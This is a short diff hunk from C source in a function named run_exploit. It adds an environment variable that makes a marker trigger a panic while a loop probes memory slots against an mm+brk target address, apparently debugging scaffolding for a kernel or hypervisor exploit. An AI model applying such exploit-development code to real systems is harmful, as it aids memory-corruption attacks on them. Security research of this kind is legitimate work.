@@ -966,6 +966,7 @@ int run_exploit(int argc, char **argv) {
         pr_info("VERIFY: target=%016zx (mm+brk) value=%016llx\n",
                 vt, (unsigned long long)magic);
         unsigned long orig_brk = (unsigned long)syscall(SYS_brk, 0);
+        setenv("PVM_W0_POISON", "1", 1); /* panic at marker = slot found */
         for (int i = 0; i <= 15; i++) {
           int slot = (6 + i) % 16; /* start at the mathematically expected 6 */
           char s[8];
